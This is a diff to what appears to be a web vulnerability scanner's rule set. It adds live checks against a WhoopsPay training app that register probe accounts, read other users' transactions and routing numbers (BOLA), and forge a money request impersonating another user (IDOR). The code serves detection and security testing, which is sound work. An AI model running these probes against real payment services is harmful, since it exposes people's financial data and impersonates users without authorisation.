@@ -28543,6 +28543,198 @@ const clientSideWhoopsPayEvidence: Rule = async (ctx) => {
   };
 };
 
+function isWhoopsPayHost(ctx: RuleContext): boolean {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}\n${ctx.combined}`;
+  return /whoopspay\.onrender\.com/i.test(corpus);
+}
+
+function whoopsPaySessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^connect\.sid=/i.test(c))?.split(";")[0] ?? null;
+}
+
+async function whoopsPayRegisterSessionCookie(ctx: RuleContext): Promise<string | null> {
+  const username = `thugir_wp_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/api/register", ctx.origin).toString();
+  const doc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      username,
+      password: "ThugirProbe123!",
+      email: `${username}@thugir-probe.example`
+    }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 20000,
+    redirect: "manual"
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  return whoopsPaySessionCookieFromDoc(doc);
+}
+
+type WhoopsPayTransaction = {
+  id?: number;
+  fromUserId?: string;
+  toUserId?: string | null;
+  amount?: number;
+  description?: string;
+  routingNumber?: string | null;
+};
+
+function whoopsPayTransactionsExposeOtherUsers(body: string): WhoopsPayTransaction[] | null {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(body);
+  } catch {
+    return null;
+  }
+  if (!Array.isArray(parsed) || parsed.length === 0) return null;
+  const rows = parsed as WhoopsPayTransaction[];
+  const foreign = rows.filter(
+    (t) =>
+      typeof t.fromUserId === "string" &&
+      /^@[a-z_]+$/i.test(t.fromUserId) &&
+      !/^@thugir/i.test(t.fromUserId)
+  );
+  if (foreign.length === 0) return null;
+  const withRouting = rows.some((t) => typeof t.routingNumber === "string" && t.routingNumber.length >= 8);
+  if (!withRouting && foreign.length < 2) return null;
+  return rows;
+}
+
+const whoopsPayTransactionsBolaLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const url = new URL("/api/transactions", ctx.origin).toString();
+  const unauthDoc = await ctx.probe.get(url, {
+    headers: { Accept: "application/json" },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  let rows = whoopsPayTransactionsExposeOtherUsers(unauthDoc.body);
+  let authMode = "unauthenticated";
+  if (!rows) {
+    const cookie = await whoopsPayRegisterSessionCookie(ctx);
+    if (!cookie) return NEGATIVE;
+    const authDoc = await ctx.probe.get(url, {
+      headers: { Accept: "application/json", Cookie: cookie },
+      maxBytes: 65536,
+      timeoutMs: 20000
+    });
+    rows = whoopsPayTransactionsExposeOtherUsers(authDoc.body);
+    authMode = "authenticated";
+    if (!rows) return NEGATIVE;
+  }
+  const sample = rows.find((t) => typeof t.fromUserId === "string" && /^@[a-z_]+$/i.test(t.fromUserId));
+  return {
+    fired: true,
+    confidence: authMode === "unauthenticated" ? 0.94 : 0.92,
+    evidence: {
+      url,
+      authMode,
+      transactionCount: rows.length,
+      sampleFromUserId: sample?.fromUserId,
+      sampleRoutingNumber: sample?.routingNumber ?? rows.find((t) => t.routingNumber)?.routingNumber,
+      snippet: JSON.stringify(sample ?? rows[0]).slice(0, 280),
+      note: `WhoopsPay GET /api/transactions returns other users' payment history (${sample?.fromUserId ?? "foreign user"}) including routing numbers — transaction list BOLA oracle`
+    }
+  };
+};
+
+const whoopsPayTransactionsBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/(?:transactions|users|payments|wallet)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await whoopsPayTransactionsBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "WhoopsPay /api/transactions route scan — GET returns other users' transactions with routing numbers — transaction list BOLA route oracle"
+    }
+  };
+};
+
+const whoopsPayMoneyRequestIdorLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const cookie = await whoopsPayRegisterSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const userUrl = new URL("/api/auth/user", ctx.origin).toString();
+  const userDoc = await ctx.probe.get(userUrl, {
+    headers: { Accept: "application/json", Cookie: cookie },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  let userId = "";
+  try {
+    const parsed = JSON.parse(userDoc.body) as { id?: string };
+    userId = String(parsed.id ?? "");
+  } catch {
+    return NEGATIVE;
+  }
+  if (!userId) return NEGATIVE;
+  const requestUrl = new URL("/api/money-request", ctx.origin).toString();
+  const victimHandle = "@elena_kowalski";
+  const doc = await ctx.probe.get(requestUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      fromUserId: victimHandle,
+      amount: 50,
+      description: "thugir-idor-probe"
+    }),
+    headers: {
+      "Content-Type": "application/json",
+      Accept: "application/json",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: { message?: string; request?: { fromUserId?: string; toUserId?: string } } | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as { message?: string; request?: { fromUserId?: string; toUserId?: string } };
+  } catch {
+    return NEGATIVE;
+  }
+  if (
+    !/Money request created successfully/i.test(String(parsed.message ?? "")) ||
+    parsed.request?.fromUserId !== victimHandle ||
+    parsed.request?.toUserId !== userId
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: requestUrl,
+      victimHandle,
+      probeUserId: userId,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: `WhoopsPay POST /api/money-request accepts fromUserId ${victimHandle} from any session — money-request sender impersonation IDOR oracle`
+    }
+  };
+};
+
+const whoopsPayMoneyRequestIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/(?:transfer|money-request|payments|users)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await whoopsPayMoneyRequestIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "WhoopsPay money-request route scan — POST fromUserId impersonates another user without ownership validation — sender IDOR route oracle"
+    }
+  };
+};
+
 // --- HackSec.in password-protected ethical hacking training portal ----------------
 const CLIENT_HACKSEC_RES: { label: string; re: RegExp }[] = [
   {
@@ -64340,6 +64532,10 @@ export const RULES: Record<string, Rule> = {
   clientSideOpenvaultCheatsheetEvidence,
   clientSideWebgoatEvidence,
   clientSideWhoopsPayEvidence,
+  whoopsPayTransactionsBolaLiveOracle,
+  whoopsPayTransactionsBolaRouteLiveOracle,
+  whoopsPayMoneyRequestIdorLiveOracle,
+  whoopsPayMoneyRequestIdorRouteLiveOracle,
   clientSideSessionHijackEvidence,
   clientSideCookiejarLabEvidence,
   clientSideSsrfEvidence,
